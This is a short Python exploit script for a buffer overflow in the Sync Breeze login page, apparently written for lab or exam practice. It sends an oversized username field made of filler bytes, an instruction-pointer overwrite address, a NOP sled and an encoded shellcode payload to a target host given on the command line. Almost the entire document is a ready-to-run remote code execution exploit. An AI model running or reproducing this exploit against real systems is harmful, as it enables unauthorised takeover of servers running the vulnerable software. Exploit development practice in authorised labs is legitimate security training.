#!/usr/bin/python3
#
# Sync breeze buffer overflow

import requests
import argparse

# Script arguments
parser = argparse.ArgumentParser(description='Sync breeze buffer overflow')
parser.add_argument('host', help='host to target')
args = parser.parse_args()

url = f"http://{args.host}/login"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Origin": "http://192.168.199.10",
    "Referer": "http://192.168.199.10/login",
    "Upgrade-Insecure-Requests": "1",
}

print(f"starting overflow on {url}")



filler = 'A'.encode('latin-1') * 780
eip = "\x83\x0c\x09\x10".encode('latin-1')
offset = 'C'.encode('latin-1') * 4
nops = "\x90".encode('latin-1') * 10
payload = ("\xda\xde\xd9\x74\x24\xf4\xba\x64\x1d\x78\xa8\x5b\x29\xc9\xb1"
"\x52\x31\x53\x17\x83\xeb\xfc\x03\x37\x0e\x9a\x5d\x4b\xd8\xd8"
"\x9e\xb3\x19\xbd\x17\x56\x28\xfd\x4c\x13\x1b\xcd\x07\x71\x90"
"\xa6\x4a\x61\x23\xca\x42\x86\x84\x61\xb5\xa9\x15\xd9\x85\xa8"
"\x95\x20\xda\x0a\xa7\xea\x2f\x4b\xe0\x17\xdd\x19\xb9\x5c\x70"
"\x8d\xce\x29\x49\x26\x9c\xbc\xc9\xdb\x55\xbe\xf8\x4a\xed\x99"
"\xda\x6d\x22\x92\x52\x75\x27\x9f\x2d\x0e\x93\x6b\xac\xc6\xed"
"\x94\x03\x27\xc2\x66\x5d\x60\xe5\x98\x28\x98\x15\x24\x2b\x5f"
"\x67\xf2\xbe\x7b\xcf\x71\x18\xa7\xf1\x56\xff\x2c\xfd\x13\x8b"
"\x6a\xe2\xa2\x58\x01\x1e\x2e\x5f\xc5\x96\x74\x44\xc1\xf3\x2f"
"\xe5\x50\x5e\x81\x1a\x82\x01\x7e\xbf\xc9\xac\x6b\xb2\x90\xb8"
"\x58\xff\x2a\x39\xf7\x88\x59\x0b\x58\x23\xf5\x27\x11\xed\x02"
"\x47\x08\x49\x9c\xb6\xb3\xaa\xb5\x7c\xe7\xfa\xad\x55\x88\x90"
"\x2d\x59\x5d\x36\x7d\xf5\x0e\xf7\x2d\xb5\xfe\x9f\x27\x3a\x20"
"\xbf\x48\x90\x49\x2a\xb3\x73\xb6\x03\xcc\x71\x5e\x56\x32\x77"
"\x24\xdf\xd4\x1d\x4a\xb6\x4f\x8a\xf3\x93\x1b\x2b\xfb\x09\x66"
"\x6b\x77\xbe\x97\x22\x70\xcb\x8b\xd3\x70\x86\xf1\x72\x8e\x3c"
"\x9d\x19\x1d\xdb\x5d\x57\x3e\x74\x0a\x30\xf0\x8d\xde\xac\xab"
"\x27\xfc\x2c\x2d\x0f\x44\xeb\x8e\x8e\x45\x7e\xaa\xb4\x55\x46"
"\x33\xf1\x01\x16\x62\xaf\xff\xd0\xdc\x01\xa9\x8a\xb3\xcb\x3d"
"\x4a\xf8\xcb\x3b\x53\xd5\xbd\xa3\xe2\x80\xfb\xdc\xcb\x44\x0c"
"\xa5\x31\xf5\xf3\x7c\xf2\x05\xbe\xdc\x53\x8e\x67\xb5\xe1\xd3"
"\x97\x60\x25\xea\x1b\x80\xd6\x09\x03\xe1\xd3\x56\x83\x1a\xae"
"\xc7\x66\x1c\x1d\xe7\xa2").encode('latin-1')

username = filler + eip + offset + nops + payload
print(username)

data = {
    "username": username,
    "password": "something"
}
try:
    response = requests.post(url, data=data, headers=headers, timeout=10)
    print("received response, overflow failed")
except requests.exceptions.ReadTimeout:
    print("request timed out")
